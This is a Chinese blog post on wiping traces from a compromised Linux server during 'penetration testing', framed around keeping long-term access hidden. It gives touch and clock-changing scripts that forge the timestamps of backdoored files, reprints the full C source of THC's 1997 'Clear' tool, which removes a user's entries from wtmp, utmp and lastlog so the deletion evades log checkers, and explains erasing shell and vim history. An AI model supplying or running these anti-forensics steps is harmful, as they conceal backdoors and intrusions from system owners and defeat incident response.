---
title: "渗透测试时给 Linux 服务器擦除痕迹的操作总结"
date: 2018-10-26 00:45:06
tags: [linux, pentest]
---

如果是要长期维持权限的话, 隐蔽自己总是需要的, 就像 `Kali Linux` 壁纸上的那句 `The quieter you become, the more you are able to hear.` 一样. 不过大部分操作都需要 `root` 权限才能完成, 毕竟如果那么轻松就能清除的话也太不安全了.

<!-- more -->

### 0x01 修改文件的更改时间

通过 `ls -la` 或者 `stat {$filename}`, 可以得到文件的修改时间, 如果上后门的话, 这个时间就会暴露这个文件是后门或者被加过后门, 我们可以通过 `touch -d {$time} {$filename}` 来修改文件的更改 / 访问时间, 比如 `touch -d "2004-02-29 16:21:42" test`, 就将 `test` 的更改 / 访问时间改为 `2004-02-29 16:21:42`. 这样在 `ls -la` 时就不会被发现. 修改改动时间 (ctime), 比较复杂, 无法直接修改到任意时间, 但可以用下面这个比较丧心病狂的 `bash` 脚本来间接实现

```sh
#!/bin/sh
now=$(date)
echo $now
sudo date --set="Sat May 11 06:00:00 IDT 2013"
chmod 777 $1
sudo date --set="$now"
```

原理是更改系统时间到你想设置的改动时间 (ctime), 然后因为 `chmod`, 文件改动时间 (ctime) 将变成系统时间, 再将系统时间改回去, 这样就将 `ctime` 变成了任意你想要的时间. 不过是真的脑洞清奇 233.

### 0x02 修改 `last`, `w`, `lastlog` 日志

`Linux` 自带上面这三个指令, 分别对应三个日志, 来记录用户的登录时间, 当前登录的用户和最后一次登录时间. `last -> /var/log/wtmp`, `w -> /var/run/utmp`, `lastlog -> /var/log/lastlog`, 这三个文件一般权限是 `664`, 也就是说只有 `root` 才能修改, 所以如果不是 `root` 的话只能祈祷维护者在登录时不要在意这些信息. 如果是 `root` 的话, 因为这三个文件都是二进制文件, 修改起来也是很不方便, 不过可以在网上找到一些写好的程序来一键完成, 比如下面这个.

```c
/********************************************************************
 * Clear v1.3b (c) 1997 by van Hauser / [THC] - vh@campus.de        *
 *                                                                  *
 * CLEAR cleans all defined system logfiles from a user's login     *
 * data. (utmp, wtmp, utmpx, wtmpx and lastlog)                     *
 *                                                                  *
 * -\> The deletion can't be detected like those done by zap, wipe,  *
 *    etc. CERT's check programs chkwtmp and chklastlog won't work! * 
 *                                                                  *
 * -\> #undef the system logfiles which do not exist on your system  *
 *                                                                  *
 * -\> Note that this version only deletes the newest entry of the   *
 *    user in the system logfilse.                                  *
 *    Use Clear v1.3a if you want to delete *all* user entries.     *
 *                                                                  *
 * Don't forget to check the logfiles generated by syslogd !        *
 * And read the article COVER-1.THC from the THC-Magazine #3 on     *
 * more information on how to cover your tracks.                    *
 * It can be found at ftp.giga.or.at /pub/hacker/THC thc-mag3.zip   *
 *                                                                  *
 * If you finally need a good acct handler too, get ah-1_0b.tgz,    *
 * also in the THC-Magazine #3 ...                                  *
 ********************************************************************/

#include <sys/types.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/file.h>
#include <fcntl.h>
#include <utmp.h>
#include <pwd.h>

/* all systems support utmp and wtmp */
#define WTMP_NAME "/var/adm/wtmp"
#define UTMP_NAME "/etc/utmp"
/* utmpx and wtmpx are present on Sys VR4 systems. solaris, irix */
 /* 
 #define WTMPX_NAME "/var/adm/wtmpx"
 #define UTMPX_NAME "/var/adm/utmpx"
 */
/* lastlog is present on linux, sunos, solaris, irix, ultrix
   osf, digital unix. Not on hpux and bsdi, freebsd and therelike. */
#define LASTLOG_NAME "/var/adm/lastlog"

#define TMP_NAME "/tmp/.XthcX.tmp"

#ifdef LASTLOG_NAME
#include <lastlog.h>
#endif
#ifdef WTMPX_NAME
#define TMPX
#include <utmpx.h>
#endif
#ifdef UTMPX_NAME
#ifndef WTMPX_NAME
#define TMPX
#include <utmpx.h>
#endif
#endif

#ifdef _PATH_UTMP
#undef UTMP_NAME
#define UTMP_NAME _PATH_UTMP
#endif
#ifdef _PATH_WTMP
#undef WTMP_NAME
#define WTMP_NAME _PATH_WTMP
#endif
#ifdef _PATH_LASTLOG
#undef LASTLOG_NAME
#define LASTLOG_NAME _PATH_LASTLOG
#endif

int f_in;
int f_out;
int g_in;
int g_out;

signed long found = 0;
#ifdef LASTLOG_NAME
struct lastlog oldll;
int check = 0;
#endif
    
void move_1(char *who, char fileout[100])
{    
    struct utmp utmp_ent;
    long pos = 0L;
 
    if ((f_out=open(TMP_NAME, O_RDONLY))>=0)
    {
        if ((g_out=open(fileout, O_WRONLY | O_TRUNC ))>=0)
        {
            while(pos != -1L)
            {
                lseek(f_out,(long) ( (long)pos * (long)(sizeof utmp_ent)), 0);
                if (read(f_out, &utmp_ent, sizeof (struct utmp)) <= 0)
		{
		    pos = -1L;
                } else {
                    if (strncmp(utmp_ent.ut_name,who,strlen(who)) != 0)
		    {
		        write (g_out, &utmp_ent, sizeof (utmp_ent));
		    } else {
			found--;
                        if (found)
                        {
                            write (g_out, &utmp_ent, sizeof (utmp_ent));
#ifdef LASTLOG_NAME
#ifndef TMPX
                            if ((found == 1) && (check))
                            {
                                oldll.ll_time = utmp_ent.ut_time;
                                strcpy(oldll.ll_line, utmp_ent.ut_line);
                                strcpy(oldll.ll_host, utmp_ent.ut_host);
                             }
#endif
#endif
			}
                    }
                    pos += 1L;
                }
	    }
	    close(f_out);
            close(g_out);
	} else {
	    printf ("Can't write %s\n", fileout);
            close(f_out);
	}
    } else
        fprintf(stderr,"Can't find tmp file (admin around?) %s\n", TMP_NAME);
}    
    
    
int kill_tmp(char *who, char file[100])
{
    struct utmp utmp_ent;
    long pos = 0L;
    found=0;

    if ((f_in=open(file,O_RDONLY))>=0) 
    {
        if ((g_in=open(TMP_NAME,O_WRONLY | O_CREAT | O_TRUNC, 0600))>=0)
        {
            while(pos != -1L) 
            {
                lseek(f_in,(long) ( pos * (long)(sizeof(struct utmp))), 0);
                if ( read(f_in, &utmp_ent, sizeof (struct utmp)) <= 0 ) 
                {
                    pos = -1L;
                } else {
                     write (g_in, &utmp_ent, sizeof (utmp_ent));
                     pos += 1L;
                     if (strncmp(utmp_ent.ut_name,who,strlen(who)) == 0)
  		         found++;
                }
            }
            close(f_in);
            close(g_in);
            return(0);
        } else {
            printf ("Can't write tmp file : %s\n", TMP_NAME);
            close(f_in);
            return(1);
        }
    } else { 
        fprintf(stderr,"Can't find %s\n", file);
        return(1);
    }
}

#ifdef TMPX
void move_2(char *who, char fileout[100])
{    
    struct utmpx utmp_ent;
    long pos = 0L;
 
    if ((f_out=open(TMP_NAME, O_RDONLY))>=0)
    {
        if ((g_out=open(fileout, O_WRONLY | O_TRUNC ))>=0)
        {
            while(pos != -1L)
            {
                lseek(f_out,(long) ( (long)pos * (long)(sizeof utmp_ent)), 0);
                if (read(f_out, &utmp_ent, sizeof (struct utmp)) <= 0)
		{
		    pos = -1L;
                } else {
                    if (strncmp(utmp_ent.ut_name,who,strlen(who)) != 0)
		    {
		        write (g_out, &utmp_ent, sizeof (utmp_ent));
		    } else {
			found--;
                        if (found)
                        {
                            write (g_out, &utmp_ent, sizeof (utmp_ent));
#ifdef LASTLOG_NAME
                            if ((found == 1) && (check))
                            {
                                 oldll.ll_time = utmp_ent.ut_xtime;
                                 strcpy(oldll.ll_line, utmp_ent.ut_line);
                                 strcpy(oldll.ll_host, utmp_ent.ut_host);
                            }
#endif
                        }
                    }
                    pos += 1L;
                }
	    }
	    close(f_out);
            close(g_out);
	} else {
	    printf ("Can't write %s\n", fileout);
            close(f_out);
	}
    } else
        fprintf(stderr,"Can't find tmp file (admin around?) %s\n", TMP_NAME);
}    

int kill_tmpx(char *who, char file[100])
{
    struct utmpx utmp_ent;
    long pos = 0L;
    found=0;
           
    if ((f_in=open(file,O_RDONLY))>=0)
    {
        if ((g_in=open(TMP_NAME,O_WRONLY | O_CREAT | O_TRUNC, 0600))>=0)
        {
            while(pos != -1L)
            {
                lseek(f_in,(long)( (sizeof(struct utmp)) * pos), 0);
                if (read (f_in, &utmp_ent, sizeof (struct utmp))<=0)
                {
                    pos = -1L;
                } else {
                     write (g_in, &utmp_ent, sizeof (utmp_ent));
                     pos += 1L;
                     if (strncmp(utmp_ent.ut_name,who,strlen(who)) == 0)
                         found++;
                }
            }
            close(f_in);
            close(g_in);
	    return(0);
        } else {
            printf ("Can't write tmp file : %s\n", TMP_NAME);
            close(f_in);
            return(1);
        }
    } else {
        fprintf(stderr,"Can't find %s\n", file);
        return(1);
   }
}
#endif

kill_lastlog(char *who)
{
    struct passwd *pwd;
    struct lastlog newll;
    if (!strlen(oldll.ll_line))
    {
        oldll.ll_time=0;
        strcpy(oldll.ll_line, "");
        strcpy(oldll.ll_host, "");
    }
 
    if ((pwd=getpwnam(who))!=NULL) 
    {
        if ((f_in=open(LASTLOG_NAME, O_RDWR)) >= 0) 
        {
            lseek(f_in, (long)pwd->pw_uid * sizeof (struct lastlog), 0);
            newll.ll_time=oldll.ll_time;
            strcpy(newll.ll_line, oldll.ll_line);
            strcpy(newll.ll_host, oldll.ll_host);
            write(f_in, (char *)&oldll, sizeof( oldll ));
            close(f_in);
        } else { 
            printf ("Can't find lastlog in %s\n", LASTLOG_NAME);
        }
    } else 
        fprintf(stderr," Can't find user %s in passwd\n",who);
}

 
main(int argc, char *argv[])
{
#ifndef TMP_NAME
    fprintf(stderr,"TMP_NAME not defined. Edit source and recompile ...\n");
    return(1);
#endif

    if (argc==2) {
    
#ifdef WTMP_NAME
	check=1;
	fprintf(stderr,"wtmp ... ");
        if (kill_tmp(argv[1], WTMP_NAME) == 0)
            move_1(argv[1], WTMP_NAME);
        check=0;
#endif
#ifdef WTMPX_NAME
	fprintf(stderr,"wtmpx ... ");
        if (kill_tmpx(argv[1], WTMPX_NAME) == 0)
            move_2(argv[1], WTMPX_NAME);
#endif
#ifdef UTMP_NAME
	fprintf(stderr,"utmp ... ");
        if (kill_tmp(argv[1], UTMP_NAME) == 0)
            move_1(argv[1], UTMP_NAME);        
#endif
#ifdef UTMPX_NAME
        fprintf(stderr,"utmpx ... ");
        if (kill_tmpx(argv[1], UTMPX_NAME) == 0)
            move_2(argv[1], UTMPX_NAME);
#endif
#ifdef LASTLOG_NAME
        if (argv[1] != "")
        {
            fprintf(stderr,"lastlog ... ");
            kill_lastlog(argv[1]);
        }
#endif
        if (unlink(TMP_NAME) < 0)
            fprintf(stderr,"Can't remove %s, do it by hand ... ",TMP_NAME);
        fprintf(stderr,"Done!\n");
        if (argv[1] != "")
            fprintf(stderr,"Last entry cleared from user %s\n",argv[1]);
    } else
        fprintf(stderr,"Usage : %s username\n",argv[0]);           
}
```

来自 1997 年的陈年代码, 但编译后仍然可以正常运行, 而且挺好用, 只要你是 `root`, 运行 `./clear root`, 直接把三个日志都给清除掉, 非常方便.

### 0x03 `.bash_history` 和 `.viminfo`

这两个清除起来比较简单, `.viminfo` 直接 `rm` 掉就 ok, 而 `.bash_history`, 需要在登出时 `history -c`, 就可以直接还原成刚进来的状态, 不留痕迹.